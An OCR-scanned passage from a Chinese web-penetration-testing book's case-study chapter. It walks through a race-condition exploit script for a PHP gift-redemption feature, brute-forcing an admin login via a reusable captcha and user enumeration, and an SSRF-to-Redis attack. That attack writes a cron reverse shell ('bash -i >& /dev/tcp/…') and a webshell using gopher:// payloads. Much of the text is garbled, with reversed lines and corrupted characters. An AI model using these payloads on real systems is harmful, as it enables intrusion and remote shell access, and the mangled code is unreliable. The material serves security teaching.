1f(1sset($this->post[*realname′])) {
Srealnane =strip_tags( $this->post['realname′]);
$emai1 = strip_tags( $this->post[*enail′]);
Sphone =strip_tags( $this->post[′phone′]);
$addr =strip_tags( $this->post[*addr′]);
$postcode =strip_tags( Sthis->post['postcode′]);
([,bb,]asodpost['notes′]);
（[.pt8,]sod-suas )seds= p8s
(apossodg=*..1|ppes=*,. I|auouds==,. 11 treuas==,. 11 aueureaug==,,)+T
()Aeuue = uejedg
$_ENV[′user′]->update_gift($this->user[ ′uid′],$realname,$enai1,$phone,$qq);
$_ENV[*gift′]->addlog($this->user[′uid’],$gid, $this->user[*usernane′],$realname,$
this->user[*emai1′],$phone,Saddr,Spostcode,$gift['title'],$q,$notes,Sgift[*cred1
t']);
$this->credit($this->user['uid’],θ, -$gift[credit']);//除富值
跟进update_giftO函数，代码如下所示，此函数的作用就是执行数据库UPDATE，
更新数据，通过对代码的检查，可以发现在query时并没有对数据库加锁，所以此处
可以考虑利用多线程造成竞争条件漏洞。
function update_gift($uid, $realname, $enai1, $phone, $qq) {
$this->db->query("UPDATE *. DB_TABLEPRE . “user SET
’realname′=′$realname′,ena11°=*Sema11°,phone′=′Sphone′,q²=′$qq′ wHERE
‘uid’=suid");
）
利用过程如下所示。
---
## Page 398
第7章实例分析379
注册一个账号并登录，当前的账号的财富值是35，想兑换的商品售价30财
富值，在正常情况下是只能兑换一件商品的，如图7-16所示。
3333
19
图7-16当前的“财富值”
·使用Python编写多线程脚本，接着使用threading新建100个线程，然后同时
请求兑换该商品（不能保证所有的请求都能执行成功），代码如下所示。
import requests
Import threading
def pos():
data - {'gid':'1′,'realname′:'test','enai1':'PI:EMAIL','phone′:'18e0eeeeee1′,
‘addr′ : '%E5%8C%97%E4%BA%AC%E9%95%BF%E5%9F%8E*,
‘postcode′:*111111′,'qq′:′1′,'notes′:'1',′submit′:'1′}_cookies={′tp_sid′:′c48b613
f61d8c6dc° , *PHPSESSID′ : *e392e7b532b5c73768cad775e86494e7′ , *tp_auth′ : *bef06n24gY5w
r = requests.post('http://127.e.0.1
/?g1ft/add.html′ , cookies=_cookies, data=data)
print(r.text)
for i in range(@,1ee):
t = threading.Thread(target=pos)
t.start()
脚本执行结束后，可以看到，已经多次兑换了该商品，并且财富值变成了-205，
如图7-17和图7-18所示。
---
## Page 399
380Web安全攻防：渗透测试实战指南
礼品公告
财富榜
8333
图7-17成功执行（1）
test刚刚兑换了礼品采集播件
test刷刚兑接了礼品采集播件
test刷刚兑换了礼品采集插件
图7-18成功执行（2）
7.2
2渗透测试实例分析
7.2.1
后台爆破
在对某网站进行渗透测试时，笔者找到了后台登录地址，登录界面如图7-19所示。
后台管理登录
帐号：
密码：
验证码：
登录
围7-19登录界面
---
## Page 400
第7章实例分析381
该登录界面存在图形验证码，一般情况下，需要使用图片识别工具识别图片中
的验证码，然后进行暴力破解，但是此验证码存在漏洞：只要不刷新页面，图形验
证码就可以一直使用。例如使用BurpSuite的Repeater工具一直发送登录的数据包，就
可以暴力破解，如图7-20所示。
rzf4
图7-20利用验证码漏润
且从返回结果可以看到，账号admin不存在，此处存在用户枚举漏洞，利用该漏
洞即可枚举系统中已经存在的账号。
现在第一步就是需要找到后台的登录账号，随便打开网站中的一篇新闻，找出
发布者，最终确定的发布者有：科技管理部、财务部、办公室等，如图7-21所示。
发布者：科技管理部击次数：100更期时间：
[打印此页]【关】
图7-21找出新闻的发布者
然后笔者尝试使用发布者名称的首字母登录，例如kiglb、cwb、bgs，发现确实
存在该账号，如图7-22所示。
---
## Page 401
382Web安全政防：渗进洲试实战指南
操作失败！密码错误！
页面将在2秒后自动跳转，如果不想等待请点击这用跳转
图7-22用户枚举
现在就需要尝试暴力破解这些用户的密码，在暴力破解前，通过网站、搜索引
肇搜索到以下这些相关信息。
。后台账号：kjglb、cwb、bgs、xxzx.
·网站域名：xxx.com。
·互联网暴露过的漏洞：SQL注入漏洞。
接下来，制定常用的密码规则，然后根据密码规则生成密码库，常用的密码规
则有（仅列举了部分规则）如下所示。
·历史密码。
历史密码倒叙
账号+@/_/！等+域名，例如ibgs@xxx、bgs_xxx等。
账号+年份，例如bgs2015、bgs2016等。
首字母大小，例如Bgs2015、Bgs2016等。
接着利用生成的密码，使用BurpSuite的Intruder功能进行暴力破解。由于登录的
数据包中的密码是经过MD5哈希的，所以还需要对Payload增加一个MD5处理，如图
7-23所示。
Payload Processing
You can define nules to pefom various processing tasks on each payload
EnabledRule
E
Hash: MD5
Remove
Up
Dowm
图7-23MD5哈希
---
## Page 402
第7章实例分析383
最终暴力破解出用户bgs的密码是Bgs2016@#，登录后台后，利用上传文件的环
境直接上传WebShell即可。
7.2.2SSRF+Redis获得WebShell
笔者在进行一次渗透测试时，没有发现目标站点存在可直接利用的漏洞，但却
发现C段中的一个网站存在SSRF漏洞，通过添加一个网址，就可以访问内部网络，
如图7-24所示。
n  / 8,RGS,d
±etsA Mtp:/127.0.188/et
图7-24SSRF温润
由于此SSRF漏洞能够在页面上回显信息，所以可以直接遍历内部信息，笔者通
过不断尝试，发现目标站点存在Redis未授权访问漏洞，如图7-25所示，
plGrt/92.16.0.46379/o
-ERR Syntax error, try CLIENT(LIST |KILL ipport |GETNAME|SETNAME connection-name) $1923  Server redis
pieo
1ee_mn
mem_allocatorjema
图7-25Redis未授权访问漏洞
下面就是利用Redis未授权访问漏洞获取反弹的Shell的过程。
在Linux系统中，使用socat进行端口转发，将Redis的6379端口转为8888端口
（目的是为了记录请求Redis的数据包），命令如下所示。
socat -v tcp-1isten:8888,fork tcp-connect:1ocalhost:6379
·新建一个redis.sh文件，内容如下所示。
[2-stpau|u\u\tg/ap/ g T- useq • • + + T/u\u\. a- oypa
-h 127.0.0.1 -p 8888 -× set 1
redis-c11 -h 127.0.8.1 -p 8888 config set dir /var/spoo1/cron/
redis-cli -h 127.0.e.1 -p 8888 config set dbfilename root
redis-c11 -h 127.0.0.1 -p 8888 save
---
## Page 403
384Web安全文防：渗造测试实战指南
上述命令是利用Redis未授权访间创建反弹Shell的命令，其中192.168.0.11
为接收端地址，2333为接受端端口，如图7-26所示，客户端利用NC监听2333
蒲口。
围7-26NC接收端
然后终端执行bashredis.sh，执行后，Socat捕获到redis的命令如下所示。
> 2818/03/19 2e:55:22.54325e 1ength=86 fron=@ to=85
*3\r
$3\r
set\
$1\r
1\
$59\
*/1 * • * * bash -i >& /dev/tcp/192.168.e.11/2333 e>&1
 2018/03/19 20:55:22.547350 1ength=57 from=0 to=56
*4\
$6\r
conf1g\r
$3\
set\
$3\
dir\
$16\
/var/spoo1/cron/\r
2018/03/19 20:55:22.55836 length=52 from= to=51
1本节的部分内容引用自https:oychou.org/web/phpssrf.html。
---
## Page 404
第7章实例分析385
*4\
$6\
config\r
$3\
set\
$1e\
dbf1lename\
$4\
root\r
 2e18/e3/19 20:55:22.552669 1ength=14 from=@ to=13
*1\r
$4\r
save\r
, u [0]auT 
continue
elif line[-3:-1] == r′\n′:
if len(line) -= 3:
eesPe%ee%,+ 3od =20d
else:
poc = poc + line.replace(′\′, *%edxea′).replace(*\n′, **)
elif 1ine = *\xea′:
e@%. + 2od = 20d
else:
line = line.replace('\n’, **)
auTT + 20d = 30d
print(poc)
执行python3redis.py后，得到的结果如图7-27所示。
---
## Page 405
386Web安全政防：渗造测试实践指南
rootglog1#python3redls.py
/t/1933
0a*/1.*efi*bash-1>
图7-27转换后的命令
在本地利用curl尝试访问以下内容，可以看到返回四条“+OK”，代表Redis
命令执行成功，如图7-28所示。
cur] -V
*gopher: / /127 , 0.0 . 1:6379/_*3%ed%8a$3%ed%Baset%ed%0a$1%ed%ea1%ed%ea$59%ed%ea%ea%ea
*/1 * ** * bash -1 >& /dev/tcp/192.168.0.11/2333
B>&1%ea%8a%8a%ed%8a*4%ad%ea$6%ed%eaconf1g%ed%ea$3%ed%8aset%ed%8a$3%8d%ead1r%ed%ea
$16%ed%ea/var/spoo1/cron/%ed%Ba*4%ed%ea$6%&d%Baconf1g%ed%ea$3%ed%easet%ed%ea$1e%e
d%eadbf11ename%ed%ea$4%ed%8aroot%ed%ea*1%ed%ea$4%ed%8asave%ed%ea
root0lg1curoaygopher://1270.0.16379/*0da53d
图7-28成功利用Redis漏洞
接下来需要利用SSRF漏洞，对上面生成的代码，进行url编码，如下所示。
gopher://127.0 e.1:6379/_*3%ed%ea$3%8d%8aset%ed%8a$1%ed%8a1%ed%8a$59%ed%8a%ea%8a*
/1 * * * * bash -1 >& /dev/tcp/192.168.0.11/2333
e>81%8a%ea%8a%ed%8a*4%ed%ea$6%ed%8aconf1gxed%ea$3%ed%easet%ed%ea$3%ad%8ad1r%ed%8a
$16%ed%ea/var/ spoo1/cron/%ad%ea*4%ed%ea$6%ed%eaconf1g%ed%ea$3%ed%easet%ed%ea$1e%e
d%adbf11enane%ed%ea$4%ed%earoot%ed%ea*1%ed%ea$4%ed%easave%ed%ea
得到的结果如下所示。
gopher%3A%2f%2f192.168 ,0, 4%3A6379%2f_%2a3%25ed%250a%243%250d%25easet%25ed%258a%24
1%250d%25ea1%25ed%250a%2459%25ed%25ea%25ea%25ea%2a%2f1%28%2a%28%2a%28%2a%20%2a%2e
bash%2e1%2e%3E%26%2e%2fdev%2ftcp%2f192.168.e.11%2F2333%20e%3E%261%25eaX258a%250a
%25ed%25ea%2a4%25ed%25ea%246%25ed%258aconfig%25ed%258aK243%25ed%25easet%250d%25ea
%243%25ed%258ad1r%25ed%25ea%2416%25ed%25ea%2fvar%2fspoo1%2fcron%2f%25ed%258a%2a4%
25ed%250a%246%25ed%258aconf1g%25ed%250a%243%25ed%258aset%250d%25ea%241e%250d%25ea
dbf11enameX250d%258aX244%258d%258ar0ot%258d%25ea%2a1%25ed%258a%244%25ed%250asave%
250d%250a
---
## Page 406
第7章实例分析387
然后利用curl请求，如下所示，如图7-29所示。
cur1 -V
‘http: //192 .168 .0.11/ssrf ,php?ur1=gopher%3A%2f%2f192.168,0.4%3A6379%2f_%2a3%25ed%
258a%243%25ed%250aset%258d%250a%241%25ed%25ea1%25ed%258a%2459%25ed%258a%250a%25ea
%2a%2f1%28%2a%28%2a%20%2a%2e%2a%28bash%20-i%28%3E%26%28%2fdev%2ftcp%2f192.168.0.1
1%2f2333%20e%3E%261%250a%25eax25eaX250d%250ax2a4%250d%250aX246%258d%250aconf1g%25
Bd%25eaX243%258d%258aset%25ed%25eaX243%25ed%258adir%258d%258a%2416%25ed%258a%2fva
r%2fspoo1%2fcron%2f%25ed%25ea%2a4%258d%25eaX246%25ed%25eaconf1g%258d%25ea%243%250
d%25easet%25ed%25ea%241e%25ed%25eadbf11ename%25ed%258a%244%250d%258aroot%258d%258
a%2a1%250d%250a%244%250d%250asave%250d%250a*
root@log:-#curlv'http://192.168.0.11/ssrf.php7url=gopher%3A%2fx2f192.168.6.4
3A6
%2f192.168.0.11%2f2333%
%3E%261%250a%250
50d%258a%243%256
p0ol%2fcr0n%2f%250d%250a%2a4%250dx250a%246%250d%2
00t%250d%250a%2a1%256d%250a%244%250d%250a5ave%250d%250a
GET /ssrf.
rt80（0）
%2a3%2
9%3E%261%250a%250a%250a%250d%250a%2a4%250d%250a%246%250d%250aC
g%258d%258a%24
d%250a%2410%250d%250adbfllenane%258d%250a%244%250d%250ar0ot%258d%250a%2a1%2
250
50dk250ax244%250d%250asave%250d%250aHTTP/1.1
Host:192.168.0.11
curl/7.47.0
图7-29利用Redis漏洞
访问请求后，成功反弹shell，如图7-30所示。
ba
11009:DAA
图7-30反弹shell
Redis还有一个常用的漏洞：只需要知道网站的绝对路径，就可以利用未授权访
问漏洞向网站目录写WebShell，命令如下所示。
---
## Page 407
388Web安全政防：涉造测试实减指龄
redis-c11 -h 127.e.0.1 -p 8889 config set dir /var/ww/html/
redis-c11 -h 127.0.0.1 -p 8889 config set dbfilenane webshe11.php
1t. [tausqam as 688g d- 1e*e*22t u- T[-stpau
redis-c11 -h 127.0.0.1 -p 8889 save
利用上面介绍的方法，得到的请求如下所示。